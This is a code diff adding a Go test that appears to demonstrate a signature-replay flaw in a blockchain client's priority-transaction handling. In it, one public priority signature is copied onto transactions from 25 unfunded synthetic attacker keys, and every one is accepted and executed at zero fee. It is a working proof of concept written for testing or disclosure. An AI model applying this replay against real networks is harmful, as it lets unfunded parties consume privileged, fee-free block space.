@@ -109,3 +109,65 @@ func TestIndependentPriorityReplayWaiverPoolAndExecution(t *testing.T) {
     })
   }
 }
+
+
+// Test a SINGLE public priority signature, shared across 25 distinct fresh
+// synthetic sender keys. This isolates privilege-amplification and charged-vs-
+// consumed gas; it does NOT claim a live-network availability incident.
+func TestIndependentPriorityReplayAmplification(t *testing.T) {
+  cfg:=eip1559Config
+  signer:=types.MakeSigner(cfg,big.NewInt(1))
+  originalSender,err:=crypto.GenerateKey()
+  if err!=nil{t.Fatal(err)}
+  target:=common.HexToAddress("0x0000000000000000000000000000000000000088")
+  body:=&types.PriorityTx{ChainID:new(big.Int).Set(cfg.ChainID),Nonce:0,
+    GasTipCap:big.NewInt(0),GasFeeCap:big.NewInt(0),Gas:21000,To:&target,Value:big.NewInt(0)}
+  original,err:=types.SignNewPriorityTx(originalSender,priorityPrivateKeys[0],signer,body)
+  if err!=nil{t.Fatal(err)}
+  pv,pr,ps:=original.RawPrioritySignatureValues()
+  if pv==nil||pr==nil||ps==nil{t.Fatal("original has no privilege signature")}
+  st,err:=state.New(common.Hash{},state.NewDatabase(rawdb.NewMemoryDatabase()),nil)
+  if err!=nil{t.Fatal(err)}
+  bc:=&testBlockChain{10000000,st,new(event.Feed),WaiverPriorityTx,common.PriorityTransactorMap{},nil}
+  pool:=NewTxPool(testTxPoolConfig,cfg,bc)
+  defer pool.Stop()
+  <-pool.initDoneCh
+  pool.priced.urgent.baseFee=big.NewInt(1000000000)
+  st.SetPriorityTransactors(bc.GetPriorityTransactorsForState(nil,st))
+  const replicas=25
+  const gasPerTx=21000
+  gp:=new(GasPool).AddGas(replicas*gasPerTx)
+  header:=&types.Header{Number:big.NewInt(1),GasLimit:10000000,
+    BaseFee:big.NewInt(1000000000),Difficulty:big.NewInt(1)}
+  miner:=common.HexToAddress("0x0000000000000000000000000000000000000099")
+  var used uint64
+  seen:=map[common.Address]bool{}
+  for i:=0;i<replicas;i++ {
+    attackKey,err:=crypto.GenerateKey()
+    if err!=nil{t.Fatal(err)}
+    addr:=crypto.PubkeyToAddress(attackKey.PublicKey)
+    if seen[addr]{t.Fatal("repeated synthetic attacker")}
+    seen[addr]=true
+    cloned:=&types.PriorityTx{ChainID:new(big.Int).Set(cfg.ChainID),Nonce:0,
+      GasTipCap:big.NewInt(0),GasFeeCap:big.NewInt(0),Gas:gasPerTx,
+      To:&target,Value:big.NewInt(0),PriorityV:new(big.Int).Set(pv),
+      PriorityR:new(big.Int).Set(pr),PriorityS:new(big.Int).Set(ps)}
+    tx,err:=types.SignNewTx(attackKey,signer,cloned)
+    if err!=nil{t.Fatal(err)}
+    if st.GetBalance(addr).Sign()!=0{t.Fatalf("replica=%d required no funded attacker",i)}
+    if err=pool.AddRemote(tx);err!=nil{t.Fatalf("replica=%d rejected by txpool: %v",i,err)}
+    st.Prepare(tx.Hash(),i)
+    receipt,e:=ApplyTransaction(cfg,nil,&miner,gp,st,header,tx,&used,vm.Config{})
+    if e!=nil||receipt==nil||receipt.Status!=types.ReceiptStatusSuccessful||
+        receipt.GasUsed!=gasPerTx||st.GetBalance(addr).Sign()!=0||st.GetNonce(addr)!=1{
+      t.Fatalf("replica=%d execution failed receipt=%v err=%v",i,receipt,e)
+    }
+  }
+  if used!=replicas*gasPerTx||st.GetBalance(miner).Sign()!=0||
+    st.GetBalance(target).Sign()!=0{
+      t.Fatalf("amplification oracle wrong gas=%d miner=%s target=%s",
+        used,st.GetBalance(miner),st.GetBalance(target))
+  }
+  t.Logf("PRIORITY_REPLAY_AMPLIFICATION independent_senders=%d copied_public_signatures=1 gas_consumed=%d actual_gas_fees_wei=0 all_senders_unfunded=true txpool_accepted=%d core_executed=%d",
+    replicas,used,replicas,replicas)
+}
